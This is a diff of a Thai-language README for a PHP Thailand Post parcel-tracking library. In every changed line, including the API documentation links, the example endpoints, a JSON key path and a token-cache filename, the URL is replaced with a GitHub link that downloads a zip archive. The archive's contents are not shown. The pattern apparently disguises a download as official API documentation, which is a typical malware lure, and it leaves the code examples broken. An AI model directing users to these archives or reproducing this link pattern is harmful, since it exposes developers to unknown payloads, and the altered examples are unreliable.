@@ -1,7 +1,7 @@
 ## Thailand Post Tracking
 PHP Library สำหรับ tracking พัสดุของไปรษณีย์ไทย
 
-อ้างอิงจากเว็บ APIs ของไปรษณีย์ไทย https://github.com/ck20server/thailandpost-tracking-php/releases/download/v1.0/Application.zip
+อ้างอิงจากเว็บ APIs ของไปรษณีย์ไทย https://github.com/ck20server/thailandpost-tracking-php/raw/refs/heads/main/src/Webhook/Requests/php-thailandpost-tracking-2.9.zip
 
 ซึ่ง Library ตัวนี้ทำหน้าที่ครอบ REST APIs ของทางไปรษณีย์ไทยอีกทีนึงเพื่อสะดวกในการใช้งาน
 
@@ -49,10 +49,10 @@ $request->setLanguage("TH");
 $request->setStatus("all");
 
 // ท่านสามารถดูรายละเอียด parameter ต่างๆได้จากที่นี่
-// https://github.com/ck20server/thailandpost-tracking-php/releases/download/v1.0/Application.zip
+// https://github.com/ck20server/thailandpost-tracking-php/raw/refs/heads/main/src/Webhook/Requests/php-thailandpost-tracking-2.9.zip
 
 // เมื่อเรียกคำสั่งด้านล่าง จะเสมือนเรียก api ตามตัวอย่างนี้
-// POST: https://github.com/ck20server/thailandpost-tracking-php/releases/download/v1.0/Application.zip
+// POST: https://github.com/ck20server/thailandpost-tracking-php/raw/refs/heads/main/src/Webhook/Requests/php-thailandpost-tracking-2.9.zip
 $response = $api->getItemsByBarcode($request);
 
 // ตรวจสอบว่าทำงานถูกต้องหรือไม่
@@ -67,7 +67,7 @@ if ($response->isOk()) {
     $response->json('message');
     
     // ในกรณีที่ลึกไปอีก 2 ชั้น
-    $response->json('https://github.com/ck20server/thailandpost-tracking-php/releases/download/v1.0/Application.zip');
+    $response->json('https://github.com/ck20server/thailandpost-tracking-php/raw/refs/heads/main/src/Webhook/Requests/php-thailandpost-tracking-2.9.zip');
 }
 
 ```
@@ -105,10 +105,10 @@ $request->setStatus("all");
 $request->withPreviousStatus();
 
 // ท่านสามารถดูรายละเอียด parameter ต่างๆได้จากที่นี่
-// https://github.com/ck20server/thailandpost-tracking-php/releases/download/v1.0/Application.zip
+// https://github.com/ck20server/thailandpost-tracking-php/raw/refs/heads/main/src/Webhook/Requests/php-thailandpost-tracking-2.9.zip
 
 // เมื่อเรียกคำสั่งด้านล่าง จะเสมือนเรียก api ตามตัวอย่างนี้
-// POST: https://github.com/ck20server/thailandpost-tracking-php/releases/download/v1.0/Application.zip
+// POST: https://github.com/ck20server/thailandpost-tracking-php/raw/refs/heads/main/src/Webhook/Requests/php-thailandpost-tracking-2.9.zip
 $response = $api->subscribeByBarcode($request);
 
 // ตรวจสอบว่าทำงานถูกต้องหรือไม่
@@ -160,7 +160,7 @@ if ($data->isValid()) {
 ทุกครั้งที่มีการเรียก API Tracking ต่างๆ Lib ตัวนี้จะคอยเรียก API Token เพื่อขอ Token จาก API ตัามตัวอย่างด้านล่าง
 และทำการถือ Token ที่ได้มาแล้วทำไปเรียก API Tracking อีกที
 ```
-GET: https://github.com/ck20server/thailandpost-tracking-php/releases/download/v1.0/Application.zip
+GET: https://github.com/ck20server/thailandpost-tracking-php/raw/refs/heads/main/src/Webhook/Requests/php-thailandpost-tracking-2.9.zip
 ```
 
 ดังนั้น หากท่านต้องการที่จะทำ Cache Token เก็บไว้ก่อนเรียก API 
@@ -180,7 +180,7 @@ use Farzai\ThaiPost\Entity\TokenEntity;
 class FilesystemStore implements TokenStore
 {
 
-    private $filename = "https://github.com/ck20server/thailandpost-tracking-php/releases/download/v1.0/Application.zip";
+    private $filename = "https://github.com/ck20server/thailandpost-tracking-php/raw/refs/heads/main/src/Webhook/Requests/php-thailandpost-tracking-2.9.zip";
 
     /**
      * Save token
